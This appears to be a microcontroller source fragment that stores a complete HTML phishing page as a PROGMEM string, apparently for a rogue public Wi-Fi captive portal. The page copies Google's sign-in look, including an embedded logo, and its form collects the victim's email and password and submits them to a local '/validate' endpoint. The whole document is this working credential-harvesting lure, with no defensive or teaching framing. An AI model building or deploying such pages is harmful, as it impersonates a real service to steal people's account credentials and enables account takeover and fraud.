//Google
const char GOOGLE_HTML[] PROGMEM = R"=====(

<html>
<head>
<title>Access public Wi-Fi - Google Login</title>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>

<style>
.login-page {
width: 360px;
padding: 8% 0 0;
margin: auto;
}
.form {
position: relative;
    z-index: 1;
background: #F7F7F7;
    max-width: 360px;
margin: 0 auto 100px;
padding: 45px;
    text-align: center;
    box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
}
.form input {
    font-family: 'Roboto', sans-serif;
outline: 0;
background: #ffffff;
width: 100%;
border: 0;
margin: 0 0 15px;
padding: 15px;
    box-sizing: border-box;
    font-size: 14px;
}
.form button {
    font-family: 'Roboto', sans-serif;
outline: 0;
background: #4E8FF4;
width: 100%;
border: 0;
padding: 15px;
color: #FFFFFF;
    font-size: 14px;
    -webkit-transition: all 0.3 ease;
transition: all 0.3 ease;
cursor: pointer;
}
.form button:hover,.form button:active,.form button:focus {
background: blue;
}
.form .message {
    text-align: right;
margin: 15px 0 0;
color: #4E8FF4;
    font-size: 12px;
}
.form .message a {
color: #4E8FF4;
    text-decoration: none;
}
.form .register-form {
display: none;
}
.container {
position: relative;
    z-index: 1;
    max-width: 300px;
margin: 0 auto;
}
.container:before, .container:after {
content: '';
display: block;
clear: both;
}
.container .info {
margin: 50px auto;
    text-align: center;
}
.container .info h1 {
margin: 0 0 15px;
padding: 0;
    font-size: 36px;
    font-weight: 300;
color: #1a1a1a;
}
.container .info span {
color: #4d4d4d;
    font-size: 12px;
}
.container .info span a {
color: #000000;
    text-decoration: none;
}
.container .info span .fa {
color: #EF3B3A;
}
body {
background: #ffffff;
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

.logo {
   
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHQAAAAmCAMAAAAiAk/pAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAb1BMVEVHcExBhfRBhfTpQjTpQjT6uwRAhPRBhPNBhPPwcCRBhfQ0qFNCgPNBhPLqQjRBhfRBhPTpQjRBhfTxaCfqQjTuYinvZSj7uwTqQjTqQjTqQjT6vAT8vAX7vAT7vAMyplE0p1JChfTqQzX7vAU0qFOsumoUAAAAIXRSTlMAH3rL8Ofs2MQInrQO+kpIX+A2FGcvHsV9rphqVY072JjUDcbcAAAC+0lEQVRYw+2XaZOjIBCGEQ2CK55onJhjc/z/37g0IAKapLZy7JftqZnKMDZPd9P9yiD0ry2vsozSDDffQzYZP/OzshSzV3c7nU6/n2eZnV1LX832drv9evZMlGoYSVOdLa8+DtXMtIrkZwZ1PpPm09AcmBzPMVDy+fLCefLSjSJCn4ZGcIzle2fhKRQSzdCXoURCH9azK0TRBUv7ce8v5WVVNWtQVghRhIPfSCa9T2SivoDVwjqycXMF24xsnnOiBqDEhBAX2u+UdzL42Eo+jO8y+/gyWdyape11sm3vz7nEym8HWiShtzYsH5ulgKb2C9JvdZratVZ+rUlT/1RLkUqTGxV1oJ1yTNQmMQv6aIY6Wsjlrz/gI1rUCnD/gSe2prCtKvJBRaoqK+GZD2VQpliefQ/7DHczdRVYRgpMXcIeqNL/CEy91AH1iFAJzNxuNkMLmyB4J8w/03liqDGuMoUuEOYvQn7eIXSQoL1ZGnWqmTPn3plCfhBfp7tJONoAcS4aKFWLsRMfk8HGqrobuwS9pJ4lbt0stAYPJnQvxoL5+59Drc25Sl9zjEEECG0UxxhEgBB3Zq50oYDa6SbcBYOOVwbVHPTrUDPj7eIlQxaTCjPA84mzKK9d2jwtL/R8sSYA0EoeNaemuaABJpdi2Uj7uZGm86FhI/0Y/WBrkn/OrP6WcMokNyAtCaivFyPTOyNDH4+MdA+EEDGqxCCrmihqsP5Fhw6x1gWodu2Jw54htt9czfmCB5UOOQ4UaRIH5R73a7k6Nl0dVH5Sx5JZBntPBtVGDdEXLH5PBpOFDuqSEpdJbam72gp+bSI11Jk5UVcE33GP27WrNp00l7rXCDYk4cuJHUyaB7tkVJdU2IeidncJ34wBt8QYV2UevlELMQSvYXYcD+PRW4oqjKVr5ozP5D4MomPo/WaPg65p6srAvG4V5dF8ycvQN0y92iKrKuVXoGpOCS5LnD6+b733RFNnwiP0LSp92/97f3WuVOoDoRX6suU5+m+e/QHHy3m8z2R8OAAAAABJRU5ErkJggg==');
    background-size: 116px 38px;
    background-repeat: no-repeat;
    float: none;
margin: 40px auto 30px;
display: block;
height: 38px;
width: 116px;
}
.banner {
    text-align: center;
}
.banner h1 {
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
color: #555;
    font-size: 42px;
    font-weight: 300;
    margin-top: 0;
    margin-bottom: 20px;
}
.banner h2 {
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
color: #555;
    font-size: 18px;
    font-weight: 400;
    margin-bottom: 20px;
}
.circle-mask {
display: block;
height: 96px;
width: 96px;
overflow: hidden;
    border-radius: 50%;
    margin-left: auto;
    margin-right: auto;
    z-index: 100;
    margin-bottom: 10px;
    background-size: 96px;
    background-repeat: no-repeat;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAAAAAB3tzPbAAACOUlEQVR4Ae3aCQrrIBRG4e5/Tz+CBAlIkIAECUjoSt48z/GZeAvnrMCvc6/38XzxAAAAYC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAMCAAAAAAAAAAAAAAAAPsagz4V4rq/FmCLTj/k4vYqgCN5/TKfjlcAJKff5pJ5QPH6Y77YBiz6a4thQJ30D03VKmB3+qfcbhOwO+l+waP/+VsEBgDV6USumgNMOtVkDbDoZIstQNHpiimA1+m8JUBSQ8kO4HBqyB1mAElNJTMAr6a8FcCmxjYjgKjGohGAU2POBmBXc7sJwKrmVhOAqOaiCUBQc8EEQO0JwPMB4ADASwhAe3yR8VPiP3/M8XOaPzQd/lLyp56xSuvnUGK0yHC313idCw6umNov+bhm5aK7fdWAZQ/WbdoXnlg5Y+mvfe2SxVdWj20FAAAAAAAAAAAAwFQAAJSS0hwmfVMIc0qlmAfsOQWvP+RDyrtNQM1L0D8WllxNAWqOXifzMVcbgG3xaswv22jAFp3a6zFteYw8fQ9DM6Amr275VG8GlFmdm8uNgDzpgqZ8EyB7XZTPNwDKpAubysWAOuvi5nolYHW6PLdeBjiCbikc1wCK0025cgUg68Zyf0DUrcXegKibi30Bq25v7QnYNKCtH+BwGpA7ugFmDWnuBSgaVOkECBpU6AOoGlbtAlg1rLULIGhYoQvAaViuC0AD6wE4Xh1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA194CuqC6onikxXwAAAAASUVORK5CYII=');
    -webkit-transition: opacity 0.075s;
    -moz-transition: opacity 0.075s;
    -ms-transition: opacity 0.075s;
    -o-transition: opacity 0.075s;
transition: opacity 0.075s;
}
</style>
</head>
<body>
<div class='logo' aria-label='Google'></div>
<div class='banner'>
<h1>
Sign in with your Google Account
</h1>
<h2 class='hidden-small'>
Sign in to continue to the Web Access
</h2>
</div>
<div class='login-page'>
<div class='form'>
<form class='login-form' action='/validate' method='GET'>
<div class='circle-mask' ></div>
<br>
<input type='email' placeholder='Enter your email' name='user' required />
<input type='password' placeholder='Enter your password' name='pass' required />
<input type='hidden' name='url' value='google.com'>
<button type='submit'>Login</button>
<p class='message'><a href='#'>Find my account</a></p>
</form>
</div>
</div>

</body>
</html>
)=====";
